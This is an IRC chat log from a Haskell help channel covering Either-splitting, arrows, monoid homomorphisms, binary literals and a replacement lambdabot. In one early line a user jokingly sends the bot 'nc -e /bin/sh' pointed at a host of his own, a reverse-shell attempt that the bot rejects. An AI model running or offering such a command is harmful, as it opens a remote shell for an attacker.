00:00:03 <Pseudonym> Later maintainers added themselves.
00:00:18 <reffie> ?system nc -e /bin/sh my_ip.com 12345
00:00:18 <rahaskella> Unknown command, try @list
00:00:21 <reffie> :(
00:00:27 <oklopol> i love the bots!
00:00:31 <Pseudonym> Not even I can do that.
00:00:37 <oklopol> kinda slow answer though
00:00:43 <Pseudonym> The "hack the box remotely" feature isn't implemented.
00:00:51 <reffie> that's too bad
00:01:38 <Pseudonym> I think they leave me in the config file out of pity more than anything else.
00:02:09 <reffie> pity?
00:03:11 <Pseudonym> ?fact Pseudonym
00:03:12 <rahaskella> pseudonym: My initial creator.
00:03:20 <fax> how do you turn literate haskell into HTML?
00:05:31 <reffie> Pseudonym you wrote lambdabot?
00:05:33 <reffie> that's cool
00:05:57 <reffie> i learned a lot of haskell by looking at the source
00:06:33 <Pseudonym> Almost none of my code is left, of course.
00:07:16 <reffie> dunno, it was several years ago
00:07:23 <reffie> 2004 or 2005
00:08:13 <Pseudonym> Oh, well, glad it's useful. :-)
00:08:26 <reffie> :)
00:09:28 <profmakx> i actually started learning haskell by hacking up modules for lambdabot
00:11:16 <Pseudonym> When I handed over lambdabot, it had the concept of a module, but it wasn't much.
00:12:26 <profmakx> hehe. the nice thing is that you got something that you want to accomplish and yet can keep it small
00:12:38 <profmakx> at the same time, if it works its rewarding too
00:14:00 <fax> grumble
00:14:08 <fax> I can't find any tool to turn .lhs into HTML
00:17:01 <int-e> use hscolour with the -lit option?
00:17:24 <int-e> or without. I never tried.
00:17:27 <fax> ok, i'll try it cheers
00:18:07 <luqui> I'm having some trouble writing a well typed function that does [Either a b] -> ([a],[b])
00:18:37 <fax> wow!
00:18:50 <fax> hscolor output to my terminal :O
00:18:50 <kfish> hi luqui! why not hpaste what you've got so far?
00:19:30 <int-e> fax: you can give an output file with -ofile , and select html output with -html
00:20:02 <fax> cool, thanks again.. I didn't know my term could do that many colors :p
00:20:10 <luqui> I've got basically this:  partition isLeft
00:20:15 <luqui> which isn't the right taack
00:20:27 <luqui> because that returns ([Either a b], [Either a b])
00:20:48 <int-e> oh you want to do it with building blocks from Data.List.
00:20:56 <luqui> not necessarily
00:21:00 <luqui> just a nice elegant implementation
00:21:17 <luqui> but my brain is being flatulent
00:21:50 <luqui> oh, there we go
00:21:53 <luqui> the gas cleared, this isn't bad
00:21:55 <luqui> :-)
00:22:33 <int-e> luqui: the simplest way is probably  splitEither xs = ([l | Left l <- xs], [r | Right r <- xs])
00:22:47 <luqui> oh woah
00:23:02 <luqui> half as efficient as it could be, but I really don't care about that
00:23:08 <int-e> i.e. using list comprehension and pattern matching.
00:23:18 <luqui> I completely forgot about list comprehensions! :-)
00:24:17 <nasloc__> any knows a way to type multi-line definition in ghci without using brace?
00:24:47 <luqui> I don't think there is one...
00:25:09 <int-e> @type foldr (either (first . (:)) (second . (:))) ([],[])
00:25:13 <rahaskella> forall a b. [Either a b] -> ([a], [b])
00:25:23 <luqui> not quite as friendly...
00:25:39 <int-e> this is a little obscure; it uses Control.Arrow.
00:25:50 <luqui> heh, I am deep in the depths of control.arrow at the moment
00:25:57 <luqui> writing an arrow myself :-)
00:26:14 <int-e> but it scans the list only once if that's what you want.
00:26:26 <luqui> don't really care
00:28:04 <int-e> and of course there's the simple recursive definition. splitEither [] = ([],[]); splitEither (x : xs) = let (ls, rs) = splitEither xs in either (\l -> (l:ls, rs)) (\r -> (ls, r:rs))
00:32:51 <newsham> http://trac.informatik.uni-bremen.de:8080/hets/browser/trunk/doc/hs2isa.pdf?rev=8501&format=raw
00:32:58 <luqui> speaking of arrows, is arr id -< ()  really the only way to do a nice "return ()" in an arrow?
00:33:08 <newsham> translating haskell to Isabelle
00:33:13 <luqui> "only" being used loosely of course
00:33:23 <ClaudiusMaximus> luqui: what about returnA ?
00:33:31 <luqui> didn't know it existed, thanks
00:33:38 <scook0_> splitEither (x:xs) = case x of { Left l -> (l:ls,rs); Right r -> (ls,r:rs) } where (ls,rs) = splitEither xs
00:34:03 <scook0_> (like int-e's, but with case instead of either)
00:34:15 <ClaudiusMaximus> luqui: use it like:  returnA -< out
00:34:20 <luqui> yep, I got it
00:34:23 <luqui> thanks
00:34:49 <luqui> it kinda bugs me that I have to put -< () for argumentless arrows
00:35:09 <luqui> but it does sorta make sence, since it wouldn't exactly be dual to <-.
00:35:17 <ClaudiusMaximus> () is not nothing...
00:35:28 <luqui> and arrows are incapable of taking nothing
00:35:37 <luqui> (not talking about Nothing of course)
00:36:04 <int-e> would you prefer to put -< undefined?
00:36:17 <luqui> that I suppose would be the proper dual to <-  :-)
00:43:36 <lloy0076> I'm using "hugs" and when I enter "inc x = x +1", it tells me, "ERROR - Syntax error in input (unexpected `=')" but I'm trying to follow "A Gentle Introduction to Haskell 98" and can't work out why it won't let me define the function x.
00:43:53 <luqui> lloy0076, try "let inc x = x + 1"
00:44:39 <lloy0076> Prelude> let inc x = x + 1
00:44:39 <lloy0076> ERROR - Syntax error in expression (unexpected end of input)
00:45:15 <lloy0076> ...I'm relatively certain it *shouldn't* be a syntax error.
00:45:26 <fax> > let inc x = x + 1 in inc 3
00:45:29 <rahaskella>  4
00:45:43 <luqui> lloy0076, it probably isn't, but it might be in interactive mode
00:45:43 <lloy0076> Ah, that wored.
00:45:45 <fax> or just put  "let inc x = x + 1" in a file, and load that file
00:45:57 <fax> er
00:45:59 <fax> without the let
00:46:40 <lloy0076> Ok, it seems that "interactive" wants to work differently to something that I ":load".
00:46:45 <lloy0076> I can work with this now. Ta :)
01:03:19 <Cale> lloy0076: yeah, it really helps to keep an editor window open alongside hugs/ghci
01:03:40 <Cale> :r will reload your file
01:08:06 <newsham> can someone explain this sentance to me?  "an interpretation of a CFG with a monoid is considered as an image of its language under a homomorphism to the monoid."
01:08:24 <newsham> (their using string concatenation as the monoid operator in the examples so far)
01:10:02 <oklopol> > let x = x + 1 in 4
01:10:04 <rahaskella>  4
01:10:09 <oklopol> > let x = x + 1 in x
01:10:11 <rahaskella>  Exception: <<loop>>
01:10:35 <DRMacIver> newsham: Do you know what each of the terms "CFG", "monoid", "image" and homomorphism mean? :)
01:10:39 <DRMacIver> If not, let's start from there.
01:10:49 <oklopol> > let a = [1] ++ a in a!!0
01:10:51 <rahaskella>  1
01:11:00 <oklopol> great language <3
01:11:09 <newsham> cfg = context free grammar.  monoid is some set with an operator that is associative and has an identity.  homomorphism is a mapping that preserves structure, yes?
01:11:15 <DRMacIver> Yep.
01:11:18 <fax> > let x = x / 2 in x
01:11:20 <rahaskella>  Exception: <<loop>>
01:11:29 <luqui> x is so zero there!
01:11:29 <fax> :t iterate
01:11:32 <rahaskella> forall a. (a -> a) -> a -> [a]
01:11:49 <fax> > last $ iterate (/2) 1
01:11:54 <newsham> I'm not sure if they plan to generalize the monoid, but so far they're talking about string concat and empty string
01:11:55 <rahaskella> Terminated
01:12:14 <newsham> I dunno what kinda homomorphism they're trying to get at
01:12:22 <DRMacIver> newsham: So what we have is some alphabet, say 'a'..'z' and a monoid M. Let's take the natural numbers, 1..
01:12:47 <Vq^> @pl x = x + 1
01:12:48 <rahaskella> x = fix (1 +)
01:13:02 <DRMacIver> newsham: Then a homomorphism from the monoid of strings in that language would a function f such that f (x ++ y) = f(x) + f(y), and f("") = 0
01:13:12 <DRMacIver> newsham: So for example, length is a homomorphism.
01:13:29 <fax> > let x = [1:x] in x
01:13:31 <rahaskella>      Occurs check: cannot construct the infinite type: t = [t]
01:13:31 <rahaskella>       Expected...
01:13:33 <newsham> ok, that makes sense.
01:13:59 <newsham> so what is the ".. considered as an image of its language under a homomorphism to that monoid"
01:14:02 <DRMacIver> newsham: So if we had some context free grammar, say (..)* (the set of all strings of even length), the image of this set under length would be the set of even numbers.
01:14:22 <DRMacIver> i.e. it's the set consisting of all elements of N which you could get by applying length to some element of our grammar.
01:14:39 <DRMacIver> So the set of even numbers is an interpretation of this grammar over N.
01:14:50 <newsham> gotcha
01:14:52 <DRMacIver> Where the homomorphism in question is N.
01:15:10 <newsham> the homomorphism is N?  not "length" ?
01:15:16 <DRMacIver> sorry
01:15:26 <DRMacIver> The homomorphism is length. I misspoke. :)
01:15:32 <newsham> ok.
01:16:22 <newsham> ok I think I understand where they're going with this
01:17:23 <DRMacIver> Glad I could help. :)
01:17:29 <newsham> appreciate it.
01:17:36 <oklopol> i wish i understood as well
01:17:47 <oklopol> guess i might with some pondering
01:18:08 <newsham> real quick quesiton..  whats the diff between an isomorphism and a homomorphism?  one is one-to-one/invertible?
01:18:18 <DRMacIver> An isomorphism is an invertible homomorphism.
01:18:22 <newsham> danke
01:18:35 <DRMacIver> (Whose inverse is also a homomorphism, but you usually get that for free with algebraic things)
01:24:26 <newsham> (the gist of what they wanted to show was that if you transform all of the terminals in the grammar with a function (ie toUpper), the language you get is the same as the language from the original grammar with the function applied to the resulting strings)
01:26:38 <DRMacIver> Ah
01:33:37 <fax> @hoogle [(a, b)] -> a -> Maybe b
01:33:38 <rahaskella> Prelude.lookup :: Eq a => a -> [(a, b)] -> Maybe b
01:33:47 <fax> thank you ;D
01:38:18 <fax> mm
01:38:24 <fax> if you have f :: a -> b -> c
01:38:38 <fax> And you do (f x) to get something :: b -> c
01:39:31 <fax> I'm trying to find another name for it than partial application ?
01:40:20 <quicksilver> what makes you think there should be another name?
01:40:28 <quicksilver> you could just call it 'application' ?
01:40:56 <fax> ok yeah
01:41:02 <fax> do you think this sounds ok? "performing an application of a single parameter to get a function of type ..."
01:41:22 <goltrpoat> applying a single parameter?
01:41:33 <DRMacIver> I always end up thinking that a partial application is something you have when you've not yet finished the project. :)
01:41:40 <fax> hehe
01:43:00 <goltrpoat> i've shipped several partial applications.
01:43:53 <DRMacIver> Applications don't get finished. They just get shipped.
01:44:24 <goltrpoat> partially.  with accompanying lexical context in form of the interns writing the docs.
01:45:02 <goltrpoat> (that'd be distributed lexical context, thank you very much)
01:45:16 <DRMacIver> They don't let me have interns, ever since I redesignated them as minions and hatched an evil plan to take over the company. :(
01:45:38 <DRMacIver> (Ok, maybe I didn't do that. But it makes a good story.)
01:45:42 <goltrpoat> common mistake.  you have to have a lair first.
01:45:52 <hpaste>  (anonymous) pasted "GHC 4.08 Prelude.c" at http://hpaste.org/2605
01:45:59 <goltrpoat> without a lair, people go, hey, look at those minions.
01:46:06 <DRMacIver> Yeah, but they won't let me have an office!
01:46:27 <DRMacIver> Anyway, I should go do some work.
01:46:47 <goltrpoat> have the minions do it.
01:46:52 <fax> If I write "f x = Nothing" am I using the Maybe Monad?
01:46:56 <fax> Or just Maybe data type
01:47:28 <fax> ah data type
01:48:02 <hpaste>  (anonymous) pasted "(no title)" at http://hpaste.org/2606
01:48:09 <goltrpoat> nothing you're saying about f is using the fact that Maybe is an instance of Monad
01:48:17 <quicksilver> fax: well that's a bit of a question of definition
01:48:19 <fax> ok thanks
01:48:19 <goltrpoat> (if that answers it)
01:48:26 <quicksilver> fax: obviously Maybe is a Monad, and you're using it
01:48:31 <quicksilver> fax: so you are using the Maybe Monad
01:48:33 <fax> mm ok
01:48:36 <quicksilver> but you're not using any of the Monad stuff
01:48:44 <quicksilver> so you're not using it in a way which uses that :)
01:50:04 <osfameron> yeah, Maybe is quite easy to "just use" without hurting your brane
01:51:03 <osfameron> that is, non-monadically, just as a wrapper to describe things
01:51:13 <hpaste>  fax pasted "numLegs" at http://hpaste.org/2607
01:51:19 <xerox> fax - If you used fail "the weasels are coming in!" instead of Nothing you'd get a type polymorphic over the monad. Likewise use 'return' in place of Just.
01:51:50 <quicksilver> however thats a terrible idea
01:51:53 <fax> OK I fixed my spelling and added a bit more.. if anyone had some comments would appreciate :D
01:51:53 <quicksilver> monads are not about failure!
01:52:11 <xerox> quicksilver: it's just they way it is now.
01:52:14 <fax> and it's valid literate haskell now instead too
01:52:15 <quicksilver> so that would be a very poor type
01:52:19 <osfameron> isn't there an mfail thingy ?
01:52:30 <quicksilver> :t fail
01:52:32 <rahaskella> forall (m :: * -> *) a. (Monad m) => String -> m a
01:52:34 <quicksilver> fail is the mfail thingy :)
01:52:35 <fax> ach I need linewrap
01:52:36 <quicksilver> but it's wrong wrong wrong
01:53:21 <goltrpoat> surely we can write a type that tells us whether or not we have an animal with a known number of legs, or not
01:53:36 <xerox> You can use mzero instead of fail.
01:53:51 <goltrpoat> minus one of the 'or not's.
01:54:00 <fax> goltrpoat: I guess so but it makes it tricky to use lookup
01:54:08 <fax> (and to actually find lookup in the first place)
01:54:33 <quicksilver> yes, mzero would be better than fail
01:54:43 <quicksilver> mzero is a nicer generalisation of Nothing, definitely
01:54:47 <goltrpoat> but we can write the lookupAnimal one-liner that uses lookup.
01:55:05 <fax> oh yeah also
01:55:32 <fax> I was wanting to ask if anyone has another example of .. having written some code then noticed you can have that code written using some haskell function?
01:56:40 <goltrpoat> that describes most of the c++ code i write day to day.
01:56:49 <fax> hahaha
01:56:55 <osfameron> fax: I had http://osfameron.vox.com/library/post/least-common-multiples---the-scenic-route.html
01:56:57 <rahaskella> http://tinyurl.com/yo4hz6
02:00:53 <osfameron> is rahaskella lambdabot?
02:02:25 <fax> osfameron: pretty cool :D
02:02:33 <fax> did you write it in lhs btw?
02:02:45 <osfameron> fax: yeah, I felt a mixture of stupid and elated afterwards :-)
02:03:02 <fax> how did you convert it to HTML?
02:03:21 <fax> (also I read that pdf you linked earlier, it's great)
02:03:22 <osfameron> fax: nah, it's not really lhs, as sometimes in the blog I show incorrect code, or multiple definitions.
02:03:29 <osfameron> (can lhs handle that?  that would be really cool)
02:03:51 <osfameron> fax: Perl script processes paragraphs.  Hands paragraphs beginning with an indented ">" to HsColour
02:03:56 <fax> I think I have to learn HTML D:
02:04:06 <fax> ah ok
02:04:18 <osfameron> i really couldn't be bothered to colour it in by hand :-)
02:04:28 <fax> hehe
02:04:38 <fax> that would be a big waste of time
02:05:09 <osfameron> unless it was just to point out particular noteworthy sections, that kind of thing
02:06:05 <osfameron> one day I'll rewrite the formatting script in Haskell as an exercise...
02:07:22 <goltrpoat> osfameron:  don't you just need lcm = minimum . concatMap factors?
02:08:20 <goltrpoat> oh, ignore that.
02:08:35 <osfameron> ok, I was wondering how to interpret it... :-)
02:08:45 <goltrpoat> can't blame you.
02:44:28 <gpi5> help
02:45:51 * profmakx does not have any money
02:50:46 <dibblego> ?hoogle [a] -> Maybe a
02:50:46 <rahaskella> Maybe.listToMaybe :: [a] -> Maybe a
02:50:46 <rahaskella> List.find :: (a -> Bool) -> [a] -> Maybe a
02:52:59 <dibblego> ?hoogle [a] -> Either x a
02:53:00 <rahaskella> No matches, try a more general search
02:53:41 <dibblego> ?hoogle [a] -> x -> Either x a
02:53:42 <rahaskella> No matches, try a more general search
03:00:39 <quicksilver> :t (. listToMaybe) . fromMaybe
03:00:42 <rahaskella> forall a. a -> [a] -> a
03:00:45 <quicksilver> perhaps
03:01:55 <quicksilver> or perhaps
03:01:59 <quicksilver> :t (. listToMaybe) . flip maybe Right . Left
03:02:02 <rahaskella> forall a a1. a1 -> [a] -> Either a1 a
03:02:53 <dibblego> ?src concatMap
03:02:53 <rahaskella> concatMap f = foldr ((++) . f) []
03:03:08 <quicksilver> that's a funny one
03:03:16 <quicksilver> I prefer concatMap = concat . map
03:03:17 <quicksilver> :)
03:03:28 <osfameron> does what it says on the tin
03:05:13 <DRMacIver> Hm. Silly question. I have a real number x and an integer n > x (if it matters, x = O(sqrt(n))). I want to find the closest integer divisor of n to x. Any good ways of doing so?
03:08:29 <goltrpoat> other than by enumeration?
03:09:31 <DRMacIver> Ideally.
03:17:48 <quicksilver> DRMacIver: for sufficiently large numbers, it worth finding out the prime factors, I believe
03:18:12 <goltrpoat> et k_1 = floor(x+1/2).  if k_i divides n, then we're done.  otherwise, there is an integer a such that a k_i > n, and (a-1) k_i < n.  let k_{i+1} = k_i + 1 if a k_i - n > n - (a-1) k_i, and k_i - 1 otherwise
03:18:35 <goltrpoat> this is linear in n.
03:19:13 <DRMacIver> quicksilver: The number in question is probably not *that* large. It's not expected to be more than about 50k. So I guess I'm being silly by not just calcuating the factors. :)
03:19:21 <DRMacIver> (Or at least enough of the factors)
03:20:20 <goltrpoat> and i guess we'll also want to terminate if k_i is either 1 or n
03:22:55 <gpi5> Anyone knowledgeable on wxHaskell? I'm having 2 textEntry widgets and when the user inputs in the first textEntry, I'd like to update the second with a transformed text. Any idea how to do that, any pointer? (I did an implementation but propagateEvent returns before the text is properly updated so I get the wrong text).
03:23:13 <DRMacIver> goltrpoat: Hm. I'll need to think about that. Thanks.
03:29:34 <DRMacIver> (Oh, damn. I've just realised I didn't need that as I can use non-integer operations here. Whoops!)
03:30:07 <quicksilver> DRMacIver: although, even given all the prime factors it isn't obvious to me how to efficiently search through the whole factor space
03:30:41 <quicksilver> DRMacIver: is 2*7 less or more than 3*5? well less, obviously, but what about for other values of 2,3,5 and 7 ?
03:32:06 <EvilTerran> hehe
03:32:24 <EvilTerran> @bot
03:32:25 <rahaskella> :)
03:33:00 <EvilTerran> hm. this bot doesn't work via /msg
03:33:06 <EvilTerran> @help
03:33:06 <rahaskella> help <command>. Ask for help for <command>. Try 'list' for all commands
03:33:11 <EvilTerran> @list
03:33:11 <rahaskella> http://www.cse.unsw.edu.au/~dons/lambdabot/COMMANDS
03:33:18 <quicksilver> it does
03:33:25 <EvilTerran> not for me
03:33:27 <quicksilver> I have used it via /msg already today
03:33:34 <quicksilver> what command are you sending it?
03:33:48 <EvilTerran> @bot, @help, > 1+2, ...
03:33:48 <rahaskella> usage: @vote <poll> <choice>
03:33:56 <EvilTerran> anyway
03:34:09 <quicksilver> odd
03:34:13 <EvilTerran> @remember quicksilver but what about for other values of 2,3,5 and 7 ?
03:34:13 <rahaskella> Done.
03:34:34 <EvilTerran> couldn't remember if that was @remember or @quote+ or whatever. there we go ;)
03:49:45 <EvilTerran> huh. it sure is quiet in here this early in the day.
03:50:04 <Botje> early? it's 12:49!
03:50:35 <EvilTerran> 11:49 here
03:50:56 <fax> I'm 1 min ahead of you ;p
03:51:09 <sieni> no wai!
03:51:19 <EvilTerran> i guess people with jobs don't generally come on here 'til the evenings, though.
03:51:27 <sieni> EvilTerran: lol
03:52:14 <hkBst> what is the proper name of `removeWhile' which removes the first elements from a list satisfying a predicate?
03:52:20 <EvilTerran> dropWhile
03:52:27 <fax> ah and I even knew this one!
03:52:37 <EvilTerran> ?docs Prelude
03:52:38 <rahaskella> http://haskell.org/ghc/docs/latest/html/libraries/base/Prelude.html
03:53:57 <quicksilver> in fact, with dropWhile, takeWhile, map, zip and unzip there isn't much you can't do
03:54:09 <EvilTerran> all you need is foldr and unfoldr ;]
04:07:29 <gleb> @yow
04:07:29 <rahaskella> Couldn't find fortune file
04:07:51 <opqdonut> :/:/
04:07:52 <opqdonut> ?bot
04:07:53 <rahaskella> :)
04:07:56 <opqdonut> hi rahaskella
04:16:31 * EvilTerran prods the c2hs installer
04:16:47 <EvilTerran> ...i don't suppose i've got any chance of getting this to install under windows /sans/ cygwin?
04:20:27 <matthew-_> You could put your computer under a window and then just use Linux.
04:23:04 <beelsebob_> you could run windows in parallels desktop and then put a terminal window beneith it
04:25:08 <ricky_clarkson> Put your computer under a window?
04:25:22 <matthew-_> throw your computer through a window?
04:25:32 <ricky_clarkson> Ah, yes.
04:25:43 <ricky_clarkson> Throw hardware out because your software is inadequate.
04:26:13 <fax> solar power Linux??
04:26:33 <ricky_clarkson> We could call it Solarix.
04:27:00 <matthew-_> you could also just make a big sign saying "Please Sue Me"
04:27:12 <fax> lol
04:27:31 <matthew-_> except, if you were proper linux geeks, it'd read "Please Sudo Me"
04:27:56 <EvilTerran> that's a no, then.
04:28:14 <matthew-_> I think that's a sound conclusion!
04:28:29 <ricky_clarkson> A perfect cadence.
04:30:30 <glen_quagmire> haskell doesn't accept binary number literal? 0b0011101
04:30:53 <matthew-_> correct
04:31:03 <matthew-_> sadly there is no binary literals in Haskell
04:31:06 <glen_quagmire> how can I represent a binary number?
04:31:07 <matthew-_> I've asked about this before
04:31:09 <matthew-_> hex
04:31:39 <matthew-_> 0x1D is the same I think
04:31:41 <pgavin> data Bin = [Maybe ()]
04:31:53 <EvilTerran> pgavin, why not [Bool], say?
04:32:01 <pgavin> EvilTerran: sure :)
04:32:12 <matthew-_> Maybe's in Monad and MonadPlus - you could do some wacky stuff that way
04:32:26 <EvilTerran> > 0x0011101 `div` 16
04:32:28 <rahaskella>  4368
04:32:28 <beelsebob_> glen_quagmire: is there a reason why it has to be binary?
04:32:38 <matthew-_> that's a nice idea pgavin  - have you actually used it?
04:32:51 <glen_quagmire> i'm trying to write IEEE-754 to float function beelsebob_
04:32:54 <EvilTerran> hm. that didn't work.
04:33:02 <EvilTerran> no, of course it didn't **headdesk**
04:33:12 <pgavin> matthew-_: no, I actually just thought it up... I was reading my functional data structures book just a minute ago, though
04:33:19 * matthew-_ hands EvilTerran a nice large mug of steaming coffee
04:33:19 <xerox> > readInt 2 (`elem` "01") digitToInt "1011010"
04:33:21 <rahaskella>  [(90,"")]
04:33:22 <pgavin> gtg, bbl
04:33:31 <EvilTerran> > 0x0011101 `logBase` 16
04:33:32 <rahaskella>  0.2485587046410369
04:33:38 * matthew-_ hands EvilTerran a nice larger mug of steaming coffee
04:33:40 <EvilTerran> ?type logBase
04:33:43 <rahaskella> forall a. (Floating a) => a -> a -> a
04:33:46 <LeCamarade> rahaskella: What did you do to lambdabot?
04:33:54 <LeCamarade> ?yow
04:33:54 <rahaskella> Couldn't find fortune file
04:34:05 <LeCamarade> ?uptime
04:34:05 <EvilTerran> now i've got a mug in each hand, so i have to type with my nose...
04:34:05 <rahaskella> uptime: 6d 1h 28m 8s, longest uptime: 9d 2h 23m 6s
04:34:10 <EvilTerran> > logBase 10 100
04:34:11 <rahaskella>  2.0
04:34:13 <LeCamarade> :-o
04:34:33 <EvilTerran> > 2 ** logBase 16 0x0011101
04:34:34 <rahaskella>  16.25931356481592
04:34:35 <LeCamarade> Channel, where is the girl? Where is lambdabot?
04:34:37 * matthew-_ hands EvilTerran a nice bucket of steaming coffee
04:34:39 <EvilTerran> i give up
04:35:07 <matthew-_> I think you wanted divRem
04:35:10 <EvilTerran> i'm sure there's *something* you can do with logs and exponents to 0x0011101 to get 0b0011101
04:35:44 <olsner> show it in hex, read it in binary
04:35:50 <matthew-_> oh. right. I hadn't realised that was what you were trying to do!
04:35:53 <EvilTerran> thanks, matthew. i think i've got enough coffee now.
04:35:55 <quicksilver> EvilTerran: I don't think so
04:36:08 <quicksilver> EvilTerran: 0x101 is 16^3 + 1, right?
04:36:12 <glen_quagmire> xerox: thanks
04:36:15 <quicksilver> EvilTerran: but logs of sums have no properties
04:36:18 <xerox> glen_quagmire: you're welcome.
04:36:21 <quicksilver> (16^2) I mean
04:36:26 <EvilTerran> eh, i guess so. it'd be a completely ridiculous approach, even if it did work.
04:36:37 <quicksilver> EvilTerran: log(16^3 + 1) has no relationshipw ith log (16^3)
04:36:45 <quicksilver> that is, no natural relationship
04:36:47 <EvilTerran> $(bin 0011101) would work, though
04:37:23 <matthew-_> or we could just, by hand, observe that 0b11101 is 0x1D
04:37:26 <EvilTerran> if you want to foray into TH. or you could drop the TH if you didn't mind the runtime expense.
04:37:49 <EvilTerran> but where's the fun in that, matthew?
04:38:21 <EvilTerran> it's the geek way -- spend an afternoon writing something to let you do what would be a five-minute job instantly
04:38:26 <glen_quagmire> @index digitToInt
04:38:27 <rahaskella> Data.Char
04:41:48 <ricky_clarkson> > let plus x y=x*2+y in foldl (plus) 0 [1,0,1,1,1]
04:41:50 <rahaskella>  23
04:42:24 <ricky_clarkson> EvilTerran: Howzat?
04:42:56 <ricky_clarkson> (can remove the parens)
04:43:10 <EvilTerran> i was thinking transforming a number would be nicer, visually, than transforming a list, but yeah, that'd do
04:43:55 <matthew-_> > 0x1D
04:43:57 <rahaskella>  29
04:44:10 <matthew-_> err, something's wrong then.
04:44:12 <idnar> @pl plus x y=x*2+y
04:44:13 <rahaskella> plus = (+) . (2 *)
04:44:23 <EvilTerran> > (let plus x y=x*2+y in foldl plus 0 . map digitToInt . show) 10111
04:44:24 <rahaskella>  23
04:44:30 <matthew-_> no, it was 11101
04:44:34 <matthew-_> not 10111
04:44:45 * EvilTerran -> lunch
04:44:54 <idnar> matthew-_: yes, but the least significant digit is on the right
04:45:08 <idnar> so the list needs to be in reverse order
04:45:18 <matthew-_> well that's rubbish then! ;)
04:45:41 <idnar> hmm.
04:45:48 <idnar> let plus x y=x*2+y in foldr (plus) 0 [1,0,1,1,1]
04:45:50 <idnar> > let plus x y=x*2+y in foldr (plus) 0 [1,0,1,1,1]
04:45:51 <rahaskella>  8
04:45:58 <idnar> er, no, that made no sense
04:46:02 <matthew-_> quite
04:46:09 <matthew-_> I thought something was wrong there
04:46:15 <idnar> > let plus x y=x*2+y in foldl (plus) 0 [1,1,1,0,1]
04:46:16 <rahaskella>  29
04:46:30 <idnar> that's the right answer, but I don't understand why that works
04:46:41 <idnar> oh wait, I guess I do
04:46:59 <idnar> you're basically shifting bits left as you go
04:47:00 <Pastorn> lb = rahaskella?
04:47:24 <alags> > puts "hi"
04:47:25 <rahaskella>   Not in scope: `puts'
04:47:34 <alags> > putStrLn "hi"
04:47:36 <rahaskella>  <IO ()>
04:47:48 <balodja1> @help run
04:47:48 <rahaskella> run <expr>. You have Haskell, 3 seconds and no IO. Go nuts!
04:48:57 <tuxplorer> what happened to lambdabot?
04:49:05 <tuxplorer> why the sudden name change?
04:49:17 <ricky_clarkson> idnar: It took me a whole minute to spot your use of foldr instead of foldl.
04:49:32 <hkBst> as opposed to a gradual name change? :)
04:49:40 <idnar> ricky_clarkson: heh
04:49:41 <quicksilver> tuxplorer: it died
04:49:47 <quicksilver> tuxplorer: someone brought a new one in instead
04:49:54 <quicksilver> tuxplorer: dunno where dons is
04:50:08 * tuxplorer mourns for lambdabot and welcomes rahaskella
04:50:55 <int-e> @where dons
04:51:01 <int-e> :P
04:51:02 <rahaskella> http://www.cse.unsw.edu.au/~dons
04:51:08 <fax> > let 0b = (*2) in 0b 10
04:51:09 <ricky_clarkson> I like not having to do tricks like this though - the language should either support binary or let you add it.
04:51:09 <rahaskella>  Parse error in pattern
04:51:11 <fax> >:|
04:51:22 <fax> > let Ob = (*2) in Ob 100010
04:51:24 <rahaskella>   Not in scope: data constructor `Ob'
04:51:26 <ricky_clarkson> E.g., in CL I can make this work - (from-roman mcmxcviii)
04:51:30 <fax> grr
04:52:07 <fax> I wanna make a function called 0b so you can do 0b 1101101
04:52:08 <ricky_clarkson> > let ob = (*2) in ob 100010
04:52:10 <rahaskella>  200020
04:52:21 <fax> why can't a function start with a numerial?
04:52:34 <mrd> parsing thinks it is a number
04:52:39 <quicksilver> just to keep the lexer relatively sane
04:52:47 <mrd> er yea, lexing
04:52:48 <quicksilver> no particularly strong reason beond that
04:53:10 <ricky_clarkson> The error message suggests that the parser/lexer/flobber thinks it's a data constructor.
04:53:15 <int-e> > let x = 2 in (+)2x -- hmm
04:53:16 <rahaskella>  4
04:53:31 <matthew-_> huh, rahaskella doesn't respond to /msg
04:53:45 <quicksilver> I think '0b' lexes as '0 b'
04:53:59 <quicksilver> matthew-_: odd. Someone else said that. she does for me
04:54:04 <int-e> matthew-_: you don't see the bot's reply I guess - it's not a registered nick
04:54:04 <matthew-_> > let plus x y=x*2+y in foldl (plus) 0 . reverse . show $ 11101
04:54:05 <quicksilver> matthew-_: are you logged on to freenode?
04:54:06 <rahaskella>   add an instance declaration for (Num Char)
04:54:14 <wli> I wonder what Roman numeral conversion in Haskell ends up looking like.
04:54:15 <fax> let x (b) y = 2*y in 0b 11010
04:54:20 <fax> > let x (b) y = 2*y in 0b 11010
04:54:22 <rahaskella>   Not in scope: `b'
04:54:25 <matthew-_> I'm registered and identified, yes
04:54:32 <quicksilver> odd then
04:54:36 <ricky_clarkson> wli: There's an example on the wiki iirc.
04:54:40 <quicksilver>  /msg -freenode rahaskella @bot
04:54:42 <quicksilver> works fine for me
04:54:44 <int-e> matthew-_: /msg nameserv set unfiltered on ... or something like that ... is a workaround.
04:54:48 <fax> > let (b) x y = 2*y in 0b11010
04:54:49 <rahaskella>  Parse error in pattern
04:54:50 <quicksilver> ah
04:54:55 <quicksilver> rahaskella isn't registered :)
04:54:56 <quicksilver> of course
04:54:59 <quicksilver> so she can't send you a message
04:55:03 <quicksilver> I have unfiltered on
04:55:55 <matthew-_> > let plus x y=x*2+ (digitToInt y) in foldl (plus) 0 . reverse . show $ 11101
04:55:56 <rahaskella>  23
04:56:06 <matthew-_> > let plus x y=x*2+ (digitToInt y) in foldl (plus) 0 . show $ 11101
04:56:07 <tuxplorer> rahaskella is also a girl?
04:56:08 <rahaskella>  29
04:56:36 <int-e> @vixen asl
04:56:37 <rahaskella> 19/f/California
04:56:42 <int-e> abviously ;)
04:56:48 <ejt> hi, is this legal haskell ...
04:56:54 <tuxplorer> @vixen why are you also female?
04:56:54 <rahaskella> just the way God made me
04:56:55 <matthew-_> > let plus x y=x*2+ (digitToInt y); ob = foldl (plus) 0 . show in ob 11101
04:56:56 <rahaskella>  29
04:57:00 * matthew-_ wins
04:57:01 <ejt> data ViewL s a = NilL | ConsL a (ViewL s a)
04:57:11 <ejt> viewL :: FingerTree a -> ViewL FIngerTree a
04:57:13 <ejt>  ?
04:57:25 <quicksilver> no
04:57:31 <ejt> ghc complains about FingerTree having kind * -> * (which is true)
04:57:32 <ricky_clarkson> matthew-_: Is that converting to chars?
04:57:41 <matthew-_> ricky_clarkson: show does, yes
04:57:44 <quicksilver> ejt: data parameters can only have kind :: *
04:57:52 <ejt> quicksilver: ah
04:57:57 <int-e> ejt: data ViewL (s :: * -> *) a = NilL | ConsL a (ViewL s a)   should work in ghc.
